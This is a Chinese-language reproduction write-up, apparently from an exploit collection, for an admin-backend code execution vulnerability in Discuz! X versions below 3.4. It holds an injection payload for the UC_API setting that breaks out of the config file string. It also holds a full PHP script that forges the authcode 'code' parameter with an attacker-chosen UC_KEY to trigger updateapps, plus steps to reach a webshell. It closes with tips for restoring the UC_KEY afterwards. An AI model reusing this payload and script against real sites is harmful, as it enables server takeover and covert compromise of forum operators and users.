Discuz! X \< 3.4 uc\_center 后台代码执行漏洞
============================================

一、漏洞简介
------------

二、漏洞影响
------------

Discuz! X \< 3.4

三、复现过程
------------

-   进入后台站长-Ucenter设置，设置UC\_KEY=随意(一定要记住，后面要用),

```{=html}
<!-- -->
```
    UC_API= http://www.0-sec.org/discuz34/uc_server');phpinfo();//

1.png

2.png

成功写进配置文件，这里单引号被转移了，我们接下来使用UC\_KEY(dz)去调用api/uc.php中的updateapps函数更新UC\_API。

利用UC\_KEY(dz) 生成code参数，使用过UC\_KEY(dz)
GetWebShell的同学肯定不陌生，这里使用的UC\_KEY(dz)就是上面我们设置的。

    <?php
    $uc_key="123456";//
    $time = time() + 720000;
    $str = "time=".$time."&action=updateapps";
    $code = authcode($str,"ENCODE",$uc_key);
    $code = str_replace('+','%2b',$code);
    $code = str_replace('/','%2f',$code);
    echo $code;

    function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
      $ckey_length = 4;
      $key = md5($key != '' ? $key : '123456');
      $keya = md5(substr($key, 0, 16));
      $keyb = md5(substr($key, 16, 16));
      $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';

      $cryptkey = $keya.md5($keya.$keyc);
      $key_length = strlen($cryptkey);

      $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
      $string_length = strlen($string);

      $result = '';
      $box = range(0, 255);

      $rndkey = array();
      for($i = 0; $i <= 255; $i++) {
        $rndkey[$i] = ord($cryptkey[$i % $key_length]);
      }

      for($j = $i = 0; $i < 256; $i++) {
        $j = ($j + $box[$i] + $rndkey[$i]) % 256;
        $tmp = $box[$i];
        $box[$i] = $box[$j];
        $box[$j] = $tmp;
      }

      for($a = $j = $i = 0; $i < $string_length; $i++) {
        $a = ($a + 1) % 256;
        $j = ($j + $box[$a]) % 256;
        $tmp = $box[$a];
        $box[$a] = $box[$j];
        $box[$j] = $tmp;
        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
      }

      if($operation == 'DECODE') {
        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
          return substr($result, 26);
        } else {
          return '';
        }
      } else {
        return $keyc.str_replace('=', '', base64_encode($result));
      }
    }
    ?>

-   将生成的数据带入GET请求中的code 参数，发送数据包    3.png

访问 http://www.0-sec.org/discuz34/config/config\_ucenter.php
代码执行成功4.png

5.png

到此成功GetWebShell，在这个过程中，有一点需要注意的是，我们修改了程序原有的UC\_KEY(dz)，成功GetWebShell以后一定要修复，有2中方法：

-   从数据库中读取authkey(uc\_server)，通过UC\_MYKEY解密获得UC\_KEY(dz)，当然有可能authkey(uc\_server)就是UC\_KEY(dz)。

-   直接进入Ucenter后台修改UC\_KEY，修改成我们GetWebShell过程中所设置的值。
